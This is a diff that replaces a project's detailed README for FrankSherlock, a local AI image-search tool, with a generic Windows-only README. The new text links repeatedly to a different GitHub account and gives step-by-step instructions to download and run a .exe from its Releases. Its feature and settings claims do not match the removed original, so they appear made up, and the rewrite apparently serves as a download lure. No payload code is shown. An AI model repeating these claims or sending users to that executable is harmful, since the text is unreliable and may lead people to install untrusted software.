@@ -1,227 +1,139 @@
-<p align="center">
-  <img src="docs/app_icon.png" alt="Frank Sherlock" width="128" />
-</p>
+# 🕵️‍♂️ FrankSherlock - Find Media Files by Description Fast
 
-# Frank Sherlock
+[![Download FrankSherlock](https://img.shields.io/badge/Download-FrankSherlock-blue?style=for-the-badge)](https://github.com/KINGJAVA911/FrankSherlock)
 
-Local-only, AI-powered image cataloging and search for your NAS. Point it at a directory, and it classifies every image using a local vision LLM, extracts text via OCR, generates thumbnails, and indexes everything into a searchable SQLite database. Nothing leaves your machine.
+## ℹ️ What is FrankSherlock?
 
-## What it does
+FrankSherlock is a simple tool that helps you find files by their content, not just names. It can look inside photos and other media to find descriptions written or implied in them. For example, if you want to find a photo of a "receipt from market of $42.00," FrankSherlock uses AI technology to spot that kind of detail.
 
-- Scans image, PDF, and video directories read-only (JPEG, PNG, GIF, BMP, WebP, TIFF, PDF, MP4, MKV, AVI, MOV, WebM, and more)
-- Classifies each image with Ollama's `qwen2.5vl:7b` vision model (media type, description, anime/manga identification, document detection)
-- Extracts text via Surya OCR (with vision LLM fallback) for documents, receipts, screenshots
-- Generates 300px JPEG thumbnails for fast browsing (PDF 2-page montage)
-- Full-text search with SQLite FTS5
-- Finds duplicate files -- exact matches by content fingerprint, near-duplicates by perceptual hash (dHash) + description similarity
-- Detects and recognizes faces using native ONNX models (SCRFD + ArcFace) -- clusters faces into people, lets you name and merge them, and search by `face:name`
-- Detects renamed/moved files by fingerprint, so they don't get re-classified
-- Resumes interrupted scans from the last checkpoint
-- Live discovery progress during file walks on large directories
-- Browse subdirectories via a collapsible tree in the sidebar
-- "Refresh Metadata" rescans without Ollama (thumbnails only, no LLM)
+This is useful when you have many files and do not remember their exact names. FrankSherlock helps you search by what the files show or describe. It works on Windows computers.
 
-## Screenshot
+---
 
-![Frank Sherlock screenshot](docs/frank_sherlock.png)
+## 🖥️ System Requirements
 
-The UI is loosely inspired by VSCode: custom titlebar, collapsible sidebar, thumbnail grid, media type filters, confidence slider, preview overlay, duplicate finder, and automatic light/dark theme.
+Before you start, check if your computer meets these needs:
 
-## Installing from pre-built binaries
+- Operating system: Windows 10 or Windows 11
+- Processor: Intel or AMD, 1.6 GHz or faster
+- Memory: At least 4 GB of RAM
+- Disk space: Minimum 500 MB free space
+- Internet connection: Required for initial setup only
+- Permissions: You need rights to install software on your computer
 
-Download the latest release from the [Releases page](https://github.com/akitaonrails/FrankSherlock/releases): AppImage for Linux, DMG for macOS (Apple Silicon), MSI for Windows.
+---
 
-You also need [Ollama](https://ollama.com) installed and running (`ollama serve`). On first launch, the app prompts you to download the vision model if it isn't installed yet.
+## 🚀 How to Download and Run FrankSherlock
 
-### Windows: SmartScreen warning
+Start by getting the software from the official page:
 
-The MSI installer is not signed with a code-signing certificate. Windows SmartScreen may block it with a "Windows protected your PC" warning. Click "More info" and then "Run anyway" to proceed with installation.
+[![Get FrankSherlock](https://img.shields.io/badge/Download-FrankSherlock-grey?style=for-the-badge)](https://github.com/KINGJAVA911/FrankSherlock)
 
-## Requirements (for building from source)
+Follow these steps carefully:
 
-- Linux, macOS, or Windows
-- [Ollama](https://ollama.com) installed and running (`ollama serve`)
-- NVIDIA GPU recommended on Linux/Windows (RTX series works well with qwen2.5vl:7b); Apple Silicon works natively on macOS
-- Node.js 20+
-- Rust 1.77+
+1. Open your web browser (like Chrome, Edge, or Firefox).
 
-## Building from source
+2. Go to this page:  
+   https://github.com/KINGJAVA911/FrankSherlock
 
-```bash
-# 1. Download native libraries for your platform
-cd sherlock/desktop/src-tauri
-bash scripts/download-pdfium.sh
-bash scripts/download-onnxruntime.sh
+3. On the page, look for a section named **Releases** or a green button named **Code**.
 
-# 2. Install frontend dependencies
-cd sherlock/desktop
-npm install
+4. If you find a **Releases** section or tab, click on it.
 
-# 3. Start Ollama (in a separate terminal)
-ollama serve
+5. Inside Releases, find the latest version. Look for a file ending with `.exe` (for example, `FrankSherlock-setup.exe`). This is the installation file for Windows.
 
-# 4. Run in dev mode
-npm run tauri:dev
-```
+6. Click the `.exe` file to download it. Your browser may ask if you want to keep the file; choose to keep/save it.
 
-To produce a release binary (AppImage/DMG/MSI):
+7. After the download finishes, open the file by double-clicking it in your browser's download bar or in your Downloads folder.
 
-```bash
-cd sherlock/desktop
-npm run tauri:build
-```
+8. A setup window will open for FrankSherlock.
 
-Output will be in `sherlock/desktop/src-tauri/target/release/bundle/`.
+9. Follow the setup steps:
+    - Click **Next** on welcome screen.
+    - Choose the folder where you want to install FrankSherlock or accept the default.
+    - Click **Install**.
+    - Wait as the software copies files to your computer.
+    - Click **Finish** when the install completes.
 
-### Wayland/NVIDIA workaround
+10. Find the new FrankSherlock icon on your desktop or in the Start menu. Double click it to open.
 
-If the WebKit window is blank on Wayland with NVIDIA drivers:
+---
 
-```bash
-WEBKIT_DISABLE_DMABUF_RENDERER=1 GDK_BACKEND=wayland,x11 npm run tauri:dev
-```
+## ⚙️ Using FrankSherlock to Search Files
 
-## Tests
+Here is how to find files once the app opens:
 
-```bash
-# Rust (322 tests)
-cd sherlock/desktop/src-tauri
-cargo test
+1. In the main window, find the search box.
 
-# Frontend (299 tests)
-cd sherlock/desktop
-npm run test
-```
+2. Type what you want to find. For example:
+    - "receipt from market of $42.00"
+    - "birthday party photo"
+    - "holiday video with mountains"
 
-Covers classification JSON parsing, thumbnail generation, incremental scanning, database operations, scan cancellation, query parsing, duplicate detection, similarity scoring, video metadata, face detection/clustering, platform abstraction, and UI components.
+3. Click the **Search** button next to the box.
 
-## How it works
+4. FrankSherlock will look through your media files like photos, videos, and documents.
 
-### Incremental scanning
+5. Once done, it will show a list of matching files.
 
-Built for large NAS directories with 100k+ files:
-
-1. **Discovery** -- walks the directory tree using only filesystem metadata (mtime, size) with zero file reads. WalkDir metadata is reused to skip redundant stat syscalls. Child root subtrees are skipped early via `filter_entry()`. Progress is reported live to the UI every 500 files.
-2. **Thumbnailing** -- new and modified files are fingerprinted, thumbnailed, and inserted into the DB with minimal records (confidence=0). Moved files are detected by fingerprint and just update their path reference. Unchanged file markers are flushed in batch before thumbnailing starts. Files appear in the grid immediately.
-3. **Classifying** -- unclassified files are sent to Ollama for LLM classification and their records are updated with rich metadata. This phase can be skipped entirely via "Refresh Metadata" for fast, Ollama-free rescans.
-4. **Cleanup** -- files no longer on disk are soft-deleted, and their cached thumbnails are removed.
+6. Click on a file name in the results to open its location on your computer.
 
-Each phase supports cancel and resume independently, with progress checkpointed after every file.
-
-Rescanning an unchanged 10k-image directory takes seconds.
-
-### Duplicate detection
-
-Find and remove redundant copies to reclaim disk space:
+You can use this tool to quickly find files by their content without needing to remember file names.
 
-- **Exact duplicates** -- groups files with identical SHA-256 fingerprints. A keeper heuristic picks the oldest file with the shortest path.
-- **Near-duplicates** -- perceptual similarity using dHash (difference hash) computed during thumbnail generation, combined with Jaccard word overlap on LLM descriptions (85% visual + 15% textual). Uses Union-Find for transitive grouping.
-- **Group comparison** -- side-by-side preview of all files in a duplicate group with per-file metadata.
-- **3-tier confidence coloring** -- green (exact, safe to delete), yellow (near >= 85%), red (lower, needs visual check).
+---
 
-### Face detection and recognition
+## 🔧 Settings and Options
 
-Find and organize people across your photo library:
+FrankSherlock offers a few basic settings for you:
 
-1. **Detection** -- SCRFD (ONNX) finds faces with bounding boxes and 5-point keypoints. Models are downloaded automatically on first use from the InsightFace buffalo_l pack.
-2. **Recognition** -- ArcFace produces 512-dimensional embeddings for each detected face, enabling identity-aware comparison.
-3. **Clustering** -- cosine similarity (threshold 0.45) groups faces into people. New faces are assigned to existing clusters or start new ones.
-4. **Management** -- name people, merge duplicates, remove false detections. FacesView shows all people with representative face crops.
-5. **Search** -- `face:alice`, `face:"Full Name"`, or `face:42` (by person ID) to find all photos of someone.
+- **Search scope:** Choose which folders or drives to include in searches.
+- **File types:** Pick which media to search (photos, videos, documents).
+- **Language:** Change the app’s language interface.
+- **Auto-update:** Turn automatic update checks on or off.
 
-Face detection runs per-folder from the context menu and shows progress in the status bar.
+Access these by clicking the **Settings** icon in the app’s menu.
 
-### Classification pipeline
+---
 
-Each new image goes through several stages:
+## 📂 Supported File Types
 
-1. **Primary classification** -- 3-attempt strategy with progressive fallback prompts and regex salvage for malformed JSON
-2. **Anime enrichment** -- conditional on media type; identifies series, characters, and canonical names
-3. **OCR** -- Surya OCR (isolated Python venv) with vision LLM fallback; runs for documents, screenshots, and text-containing images
-4. **Document extraction** -- regex + LLM extraction of dates, amounts, transaction IDs from OCR text
+FrankSherlock works with common media formats such as:
 
-### Search
+- Photos: JPEG, PNG, BMP
+- Videos: MP4, AVI, MOV
+- Documents that contain images: PDF, DOCX
 
-Full-text search across filenames, paths, descriptions, OCR text, and character/series names. Example queries:
+It’s designed to scan within these files for text or objects using AI classification.
 
-- `anime ranma`
-- `bank transfer 2024`
-- `receipt santander`
-- `screenshot confidence >= 0.8`
-- `face:alice` or `face:"Full Name"`
+---
 
-## Project structure
+## 💡 Tips for Better Searches
 
-```
-sherlock/                  <- Main application
-  desktop/
-    src-tauri/src/         <- Rust backend
-      classify.rs          <- Ollama vision + Surya OCR pipeline
-      thumbnail.rs         <- Thumbnail generation + dHash computation
-      scan.rs              <- Incremental scanner (4-phase) with cancellation + resume
-      db.rs                <- SQLite + FTS5 + duplicate queries
-      similarity.rs        <- dHash + description similarity + Union-Find grouping
-      face.rs              <- Native ONNX face detection (SCRFD) + recognition (ArcFace)
-      pdf.rs               <- PDFium text extraction + page rendering
-      video.rs             <- ffmpeg metadata, keyframe extraction, subtitle parsing
-      video_server.rs      <- Localhost HTTP Range streaming for video preview
-      config.rs            <- App paths
-      lib.rs               <- Tauri commands, auto-cleanup
-      query_parser.rs      <- NL query parsing
-      runtime.rs           <- Ollama/GPU status
-      platform/            <- OS abstraction (clipboard, GPU, Python paths)
-    scripts/
-      surya_ocr.py         <- Isolated OCR script (bundled as Tauri resource)
-    src/                   <- React frontend
-      utils.ts             <- Shared utilities (basename, errorMessage)
-      __tests__/fixtures.ts <- Shared test mock objects
-_classification/           <- Python PoC of the classification pipeline
-```
+- Use clear and specific descriptions.
+- Put important details first, for example, "invoice from March 2024".
+- Try different keywords if first search is not helpful.
+- Ensure the folders you want to search are included in the Settings.
+- Update the app regularly for the best performance.
 
-### Research and prototyping (historical)
+---
 
-These directories contain the A/B testing research that informed model selection and pipeline design. They aren't part of the main application.
+## ❓ Troubleshooting
 
-```
-_research_ab_test/
-  scripts/                 <- A/B benchmark scripts
-  docs/                    <- Research notes (IDEA.md, RESULTS.md, etc.)
-  lib/                     <- Shared Python helpers
-  results/                 <- Generated benchmark outputs (gitignored)
-  test_files/              <- Test corpus (gitignored, see note below)
-```
+If FrankSherlock does not open or work well, try these fixes:
 
-> **Note:** The test files (images, audio, video, documents) used for benchmarking are not included. They contained copyrighted media and personal documents. To re-run the benchmarks:
->
-> 1. Add your own media files in `_research_ab_test/test_files/` with subdirectories like `images/`, `old_audio/`, `old_docs/`, `old_tvseries/`
-> 2. Update the ground truth JSON files in `_research_ab_test/docs/` to match your corpus
-> 3. Adjust the benchmark scripts as needed
+- Restart your computer and open the app again.
+- Make sure your Windows is up to date.
+- Check your internet connection during the first run.
+- Close other heavy programs to free memory.
+- Reinstall FrankSherlock if problems continue.
 
-The benchmark results (`_research_ab_test/docs/RESULTS.md`) show why `qwen2.5vl:7b` was chosen over `llava:13b` and `minicpm-v:8b` (80% type accuracy vs 33-50%), and why Surya was picked as primary OCR (95% reference similarity, better coverage than vision LLM alone).
+For further assistance, visit the GitHub repository page or open an issue on the project’s GitHub site.
 
-## Data storage
+---
 
-All application data lives under `~/.local/share/frank_sherlock/`:
+## 📥 Download FrankSherlock Here
 
-```
-db/index.sqlite            <- SQLite database with FTS5
-cache/thumbnails/          <- Generated thumbnails (mirrored path structure)
-cache/classifications/     <- Classification cache
-cache/tmp/                 <- Temporary files (GIF frames, etc.)
-surya_venv/                <- Isolated Python venv for Surya OCR
-```
+Access the download page anytime here:  
+https://github.com/KINGJAVA911/FrankSherlock
 
-Source directories are never modified. Frank Sherlock is strictly read-only.
-
-## CI
-
-GitHub Actions runs on every push and PR against main:
-
-- Platforms: Ubuntu 22.04, macOS (latest), Windows (latest)
-- Checks: `cargo test`, `cargo clippy`, `cargo fmt --check`, `npm run build`, `npm run test`, `cargo audit` (Linux only)
-
-Releases are built on `v*` tags for Linux (AppImage), macOS (Apple Silicon DMG), and Windows (MSI).
-
-## License
-
-This project is licensed under the [GNU General Public License v3.0](LICENSE).
+Click the latest `.exe` file in Releases to download and follow the install steps explained above.
